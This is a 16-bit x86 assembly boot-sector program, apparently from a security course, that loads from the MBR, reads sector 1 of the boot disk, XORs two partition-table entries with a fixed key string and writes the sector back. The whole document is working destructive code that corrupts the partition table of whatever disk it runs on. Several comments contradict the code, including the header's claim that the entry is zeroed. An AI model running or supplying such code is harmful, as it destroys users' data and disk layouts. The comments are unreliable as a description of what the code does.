;
; This code attempts to remove an entry from the partition
; table. The entry will be zeroed out.
;
; Written by: Your boss from COMP6845
;

[bits 16]
[org 0x1000]

%define SECTOR_READ_ADDR        0x1500
%define STACK_ADDR              0x600
%define PARTITION_OFFSET        0x1be
%define PARTITION_ENTRY_SIZE    0x10

_start:
    cli
    xor ax, ax

    mov ds, ax                  ; Set data segment to 0
    mov es, ax                  ; extra segment = 0
    mov ss, ax                  ; stack segment = 0

    mov sp, STACK_ADDR

    mov di, 0x1000              ; new memory addr for this MBR
    mov si, 0x7c00              ; where this MBR is currently at
    mov cx, 0x0100              ; size of the MBR (0x100 = 256) but we are writing words

    rep movsw                   ; copy the mbr to 0x1000
    jmp 0:_wipe_part            ; jumps to new address starting at 0x600

_wipe_part:
    mov [drive_type], dl        ; save the drive type that BIOS gave us

    call _reset_disk

    mov si, reading_disk_msg
    call _print_str

    ; read the sector containing the mbr into memory
    mov al, 0x1                 ; num of sectors to read
    mov ch, 0x0                 ; cylinder to read from
    mov dh, 0x0                 ; head to read from
    mov cl, 0x1                 ; sector to read from
    mov bx, SECTOR_READ_ADDR    ; where to store the sector we read
    call _read_sector
    
    ; xor the entry/entries
    lea di, [SECTOR_READ_ADDR]  ; get MBR start address
    add di, PARTITION_OFFSET    ; offset to first partition entry
    mov si, xor_string          ; load strings to xor
    xor bx, bx                  ; use bx as counter
_xor_loop:
    cmp bx, 0x20                ; loop 32 times ~ 2 entries
    jge _xor_end
    
    ; mod the counter to repeat xor string
    xor dx, dx                  ; dx contains remainder
    mov ax, bx                  ; load current counter/index to ax
    mov cx, 0x10                ; length of xor string
    div cx                      ; do ax / cx
                                ; dx contains remainder, ax contains quotient
    mov cx, bx                  ; save current counter/index
    mov bx, dx                  ; use remainder to index into xor string
    mov al, byte [si + bx]      ; can only use bx to index [] in asm
    mov bx, cx
    mov cl, byte [di + bx]      ; use current counter to index to entry/memory
    xor al, cl
    mov [di + bx], al
    
    inc bx
    jmp _xor_loop
_xor_end:
    xor ax, ax                  ; null out registers else error
    xor bx, bx
    xor cx, cx
    xor dx, dx

    ; write the local copy of the partition onto the disk
    mov al, 0x1                 ; num of sectors to read
    mov ch, 0x0                 ; cylinder to read from
    mov dh, 0x0                 ; head to read from
    mov cl, 0x1                 ; sector to read from
    mov bx, SECTOR_READ_ADDR    ; where to store the sector we read
    call _write_sector
    
    mov si, xor_done            ; print success message
    call _print_str

    hlt

_reset_disk:
    mov ah, 0x0
    int 0x13                    ; reset the disk
    jc _reset_error
    ret

_read_sector:
    mov ah, 0x2                 ; code for specifying reading sectors
    int 0x13
    jc _read_error
    ret

_write_sector:
    mov ah, 0x3
    int 0x13
    jc _write_error
    ret

_write_error:
    mov si, write_error_msg
    call _print_str
    hlt

_reset_error:
    mov si, reset_disk_error_msg
    call _print_str
    hlt

_read_error:
    mov si, read_disk_error_msg
    call _print_str
    hlt

_print_str:
    lodsb
    or al, al           ; did we reach a null byte?
    jz _print_end
    mov ah, 0xe
    int 0x10
    jmp _print_str

_print_end:
    ret

reading_disk_msg:           db "Reading sector 1 of disk!", 0x00
reset_disk_error_msg:       db "Error resetting disk.", 0x00
read_disk_error_msg:        db "Error reading sector.", 0x00
write_error_msg:            db "Error writing sector.", 0x00
xor_string:                 db "dafuq do u want?", 0x00
xor_done:                   db "Finish xor-ing.", 0x00
drive_type:                 dw 0x0000

; fill the mbr will null bytes to acquire the 512 byte size
times 0x1be - ($ - $$) db 0x00

; partition table
PART_1: times 16 db 0xaa
PART_2: times 16 db 0xbb
PART_3: times 16 db 0xcc
PART_4: times 16 db 0xdd

; boot signature
dw 0xaa55
